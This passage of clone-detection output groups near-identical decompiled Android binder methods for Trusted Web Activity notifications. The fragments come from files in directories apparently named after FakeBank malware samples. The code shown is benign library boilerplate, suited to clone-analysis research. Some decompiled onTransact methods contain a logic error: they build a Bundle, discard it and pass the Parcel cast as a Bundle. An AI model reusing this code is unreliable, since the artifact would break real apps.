            parcel1.writeInt(1);
            param2Bundle.writeToParcel(parcel1, 0);
          } else {
            parcel1.writeInt(0);
          } 
          if (!this.mRemote.transact(2, parcel1, parcel2, 0) && ITrustedWebActivityCallback.Stub.getDefaultImpl() != null) {
            ITrustedWebActivityCallback.Stub.getDefaultImpl().onExtraCallback(param2String, param2Bundle);
            return;
          } 
          parcel2.readException();
          return;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="427" endline="448" pcid="1594">
    public void cancelNotification(Bundle param1Bundle) throws RemoteException {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
        if (param1Bundle != null) {
          parcel1.writeInt(1);
          param1Bundle.writeToParcel(parcel1, 0);
        } else {
          parcel1.writeInt(0);
        } 
        if (!this.mRemote.transact(3, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
          ITrustedWebActivityService.Stub.getDefaultImpl().cancelNotification(param1Bundle);
          return;
        } 
        parcel2.readException();
        return;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="240" endline="261" pcid="1584">
      public void cancelNotification(Bundle param2Bundle) throws RemoteException {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
          if (param2Bundle != null) {
            parcel1.writeInt(1);
            param2Bundle.writeToParcel(parcel1, 0);
          } else {
            parcel1.writeInt(0);
          } 
          if (!this.mRemote.transact(3, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
            ITrustedWebActivityService.Stub.getDefaultImpl().cancelNotification(param2Bundle);
            return;
          } 
          parcel2.readException();
          return;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityCallback.java" startline="134" endline="156" pcid="1566">
    public void onExtraCallback(String param1String, Bundle param1Bundle) {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityCallback");
        parcel1.writeString(param1String);
        if (param1Bundle != null) {
          parcel1.writeInt(1);
          param1Bundle.writeToParcel(parcel1, 0);
        } else {
          parcel1.writeInt(0);
        } 
        if (!this.mRemote.transact(2, parcel1, parcel2, 0) && ITrustedWebActivityCallback.Stub.getDefaultImpl() != null) {
          ITrustedWebActivityCallback.Stub.getDefaultImpl().onExtraCallback(param1String, param1Bundle);
          return;
        } 
        parcel2.readException();
        return;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityCallback.java" startline="91" endline="113" pcid="1562">
      public void onExtraCallback(String param2String, Bundle param2Bundle) {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityCallback");
          parcel1.writeString(param2String);
          if (param2Bundle != null) {
            parcel1.writeInt(1);
            param2Bundle.writeToParcel(parcel1, 0);
          } else {
            parcel1.writeInt(0);
          } 
          if (!this.mRemote.transact(2, parcel1, parcel2, 0) && ITrustedWebActivityCallback.Stub.getDefaultImpl() != null) {
            ITrustedWebActivityCallback.Stub.getDefaultImpl().onExtraCallback(param2String, param2Bundle);
            return;
          } 
          parcel2.readException();
          return;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
</class>

<class classid="25" nclones="8" nlines="23" similarity="94">
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="290" endline="311" pcid="1536">
      public Bundle getActiveNotifications() {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          Bundle bundle;
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
          if (!this.mRemote.transact(5, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
            bundle = ITrustedWebActivityService.Stub.getDefaultImpl().getActiveNotifications();
            return bundle;
          } 
          parcel2.readException();
          if (parcel2.readInt() != 0) {
            bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
          } else {
            bundle = null;
          } 
          return bundle;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="505" endline="526" pcid="1598">
    public Bundle getSmallIconBitmap() throws RemoteException {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        Bundle bundle;
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
        if (!this.mRemote.transact(7, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
          bundle = ITrustedWebActivityService.Stub.getDefaultImpl().getSmallIconBitmap();
          return bundle;
        } 
        parcel2.readException();
        if (parcel2.readInt() != 0) {
          bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
        } else {
          bundle = null;
        } 
        return bundle;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="291" endline="312" pcid="1586">
      public Bundle getActiveNotifications() throws RemoteException {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          Bundle bundle;
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
          if (!this.mRemote.transact(5, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
            bundle = ITrustedWebActivityService.Stub.getDefaultImpl().getActiveNotifications();
            return bundle;
          } 
          parcel2.readException();
          if (parcel2.readInt() != 0) {
            bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
          } else {
            bundle = null;
          } 
          return bundle;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="478" endline="499" pcid="1596">
    public Bundle getActiveNotifications() throws RemoteException {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        Bundle bundle;
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
        if (!this.mRemote.transact(5, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
          bundle = ITrustedWebActivityService.Stub.getDefaultImpl().getActiveNotifications();
          return bundle;
        } 
        parcel2.readException();
        if (parcel2.readInt() != 0) {
          bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
        } else {
          bundle = null;
        } 
        return bundle;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="317" endline="338" pcid="1538">
      public Bundle getSmallIconBitmap() {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          Bundle bundle;
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
          if (!this.mRemote.transact(7, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
            bundle = ITrustedWebActivityService.Stub.getDefaultImpl().getSmallIconBitmap();
            return bundle;
          } 
          parcel2.readException();
          if (parcel2.readInt() != 0) {
            bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
          } else {
            bundle = null;
          } 
          return bundle;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="318" endline="339" pcid="1588">
      public Bundle getSmallIconBitmap() throws RemoteException {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          Bundle bundle;
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
          if (!this.mRemote.transact(7, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
            bundle = ITrustedWebActivityService.Stub.getDefaultImpl().getSmallIconBitmap();
            return bundle;
          } 
          parcel2.readException();
          if (parcel2.readInt() != 0) {
            bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
          } else {
            bundle = null;
          } 
          return bundle;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="477" endline="498" pcid="1546">
    public Bundle getActiveNotifications() {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        Bundle bundle;
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
        if (!this.mRemote.transact(5, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
          bundle = ITrustedWebActivityService.Stub.getDefaultImpl().getActiveNotifications();
          return bundle;
        } 
        parcel2.readException();
        if (parcel2.readInt() != 0) {
          bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
        } else {
          bundle = null;
        } 
        return bundle;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="504" endline="525" pcid="1548">
    public Bundle getSmallIconBitmap() {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        Bundle bundle;
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
        if (!this.mRemote.transact(7, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
          bundle = ITrustedWebActivityService.Stub.getDefaultImpl().getSmallIconBitmap();
          return bundle;
        } 
        parcel2.readException();
        if (parcel2.readInt() != 0) {
          bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
        } else {
          bundle = null;
        } 
        return bundle;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
</class>

<class classid="26" nclones="2" nlines="18" similarity="92">
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityCallback.java" startline="55" endline="72" pcid="1558">
    public boolean onTransact(int param1Int1, Parcel param1Parcel1, Parcel param1Parcel2, int param1Int2) {
      if (param1Int1 != 2) {
        if (param1Int1 != 1598968902)
          return super.onTransact(param1Int1, param1Parcel1, param1Parcel2, param1Int2); 
        param1Parcel2.writeString("android.support.customtabs.trusted.ITrustedWebActivityCallback");
        return true;
      } 
      param1Parcel1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityCallback");
      String str = param1Parcel1.readString();
      if (param1Parcel1.readInt() != 0) {
        Bundle bundle = (Bundle)Bundle.CREATOR.createFromParcel(param1Parcel1);
      } else {
        param1Parcel1 = null;
      } 
      onExtraCallback(str, (Bundle)param1Parcel1);
      param1Parcel2.writeNoException();
      return true;
    }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityCallback.java" startline="56" endline="73" pcid="1608">
    public boolean onTransact(int param1Int1, Parcel param1Parcel1, Parcel param1Parcel2, int param1Int2) throws RemoteException {
      if (param1Int1 != 2) {
        if (param1Int1 != 1598968902)
          return super.onTransact(param1Int1, param1Parcel1, param1Parcel2, param1Int2); 
        param1Parcel2.writeString("android.support.customtabs.trusted.ITrustedWebActivityCallback");
        return true;
      } 
      param1Parcel1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityCallback");
      String str = param1Parcel1.readString();
      if (param1Parcel1.readInt() != 0) {
        Bundle bundle = (Bundle)Bundle.CREATOR.createFromParcel(param1Parcel1);
      } else {
        param1Parcel1 = null;
      } 
      onExtraCallback(str, (Bundle)param1Parcel1);
      param1Parcel2.writeNoException();
      return true;
    }
</source>
</class>

</clones>
